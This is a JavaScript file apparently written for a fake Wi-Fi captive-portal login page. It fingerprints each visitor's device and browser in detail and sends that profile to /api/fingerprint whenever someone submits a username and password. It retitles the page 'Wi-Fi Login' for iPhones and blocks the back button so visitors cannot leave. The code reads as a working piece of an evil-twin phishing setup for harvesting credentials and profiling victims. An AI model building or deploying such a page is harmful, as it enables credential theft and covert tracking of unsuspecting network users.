(function() {
    'use strict';

    function getFingerprint() {
        const fp = {
            screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
            navigator: {
                userAgent: navigator.userAgent, platform: navigator.platform,
                language: navigator.language, hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown', maxTouchPoints: navigator.maxTouchPoints || 0
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            touchSupport: 'ontouchstart' in window,
            referrer: document.referrer || 'direct',
            timestamp: new Date().toISOString()
        };
        return JSON.stringify(fp);
    }

    function setFingerprint() {
        const fpField = document.getElementById('fingerprint');
        if (fpField) fpField.value = getFingerprint();
    }

    function detectDevice() {
        const ua = navigator.userAgent.toLowerCase();
        const icon = document.getElementById('device-icon');
        if (!icon) return;
        if (/iphone|ipad|ipod/.test(ua)) { icon.textContent = '🍎'; document.title = 'Wi-Fi Login'; }
        else if (/android/.test(ua)) icon.textContent = '🤖';
        else if (/windows/.test(ua)) icon.textContent = '💻';
        else if (/macintosh|mac os/.test(ua)) icon.textContent = '🖥️';
    }

    function handleForm() {
        const form = document.getElementById('login-form');
        const btn = document.querySelector('.submit-btn');
        const btnText = document.querySelector('.btn-text');
        const btnLoader = document.querySelector('.btn-loader');
        if (!form) return;

        form.addEventListener('submit', function(e) {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if (!u || !p) { e.preventDefault(); return; }
            if (btn) btn.disabled = true;
            if (btnText) btnText.style.display = 'none';
            if (btnLoader) btnLoader.style.display = 'inline';
            fetch('/api/fingerprint', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: getFingerprint()
            }).catch(() => {});
        });
    }

    function autoFocus() {
        const first = document.querySelector('input[type="text"]');
        if (first) setTimeout(() => first.focus(), 300);
    }

    function trapNav() {
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function() { history.pushState(null, null, location.href); });
    }

    document.addEventListener('DOMContentLoaded', function() {
        setFingerprint(); detectDevice(); handleForm(); autoFocus(); trapNav();
    });
})();
